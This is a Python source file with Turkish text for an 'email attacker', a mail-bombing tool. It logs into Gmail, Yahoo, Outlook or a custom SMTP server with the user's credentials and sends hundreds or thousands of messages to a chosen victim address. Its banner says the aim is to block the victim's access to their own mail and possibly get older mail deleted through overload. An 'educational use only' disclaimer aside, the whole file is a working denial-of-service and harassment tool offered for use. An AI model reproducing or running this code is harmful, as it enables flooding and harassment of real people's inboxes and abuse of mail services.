import smtplib
import sys
import os
os.system("clear")



class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '\n\n\t\t\t\t\t\t---eMail Saldırganı---')
    print(bcolors.GREEN + '''
        Bu program hedef maile belirtilen sayıca mail göndererek kurbanın kendi maillerine erişmesini engellemek 
        hatta kurbanın kullandığı mail servisine bağlı olarak aşırı yükleme sebebiyle eski maillerini silebilirsiniz.

        YASAL UYARI: BU SİSTEM TAMAMEN EĞİTİM AMAÇLI OLARAK ÜRETİLMİŞTİR, EĞİTİM HARİCİ KULLANILAMAZ!!!

        Geliştirici: Alper KENDİRLİ
                     ''')


class Email_Dos:   #!
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n-----Program Kurulumu-----')
            self.target = str(input(bcolors.GREEN + 'Hedef mail adresi : '))
            self.mode = int(input(bcolors.GREEN + 'Saldırı modunu seçiniz (1 = 1000, 2 = 500, 3 = 250, 4 = özel) : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('HATA: Yanlış seçenek seçildi.')
                print('\n\nProgram kapatılıyor...\n\n\n')
                sys.exit(1)
        except Exception as e:
            print(f'HATA: {e}')

    def set_Attack(self):
        try:
            print(bcolors.RED + '\n-----Saldırının ayarlanması-----')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Saldırı sayısını giriniz : '))
            print(bcolors.GREEN + f'\nSeçilen saldırı modu: {self.mode} ve saldırı sayısı: {self.amount}')
        except Exception as e:
            print(f'HATA: {e}')

    def set_Email(self):
        try:
            print(bcolors.RED + '\n-----Saldırı yapacak mailin ayarlanması-----')
            self.server = str(input(bcolors.GREEN + 'Kendi mail server`ınızı giriniz VEYA ön ayarlı mail servislerinden seçiniz - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Port numarasını giriniz : '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Saldırıyı yapacak mail adresini giriniz : '))
            self.fromPwd = str(input(bcolors.GREEN + 'Saldırgan maile ait şifreyi giriniz : '))
            self.subject = str(input(bcolors.GREEN + 'Konu başlığını giriniz : '))
            self.message = str(input(bcolors.GREEN + 'Mesaj içeriğini giriniz : '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'HATA: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'Gerçekleşen saldırı sayısı: {self.count}')
        except Exception as e:
            print(f'HATA: {e}')

    def attack(self):
        print(bcolors.RED + '\nSaldırılıyor...')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.RED + '\nSaldırı tamamlandı...')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Dos() #!
    bomb.set_Attack()
    bomb.set_Email()
    bomb.attack()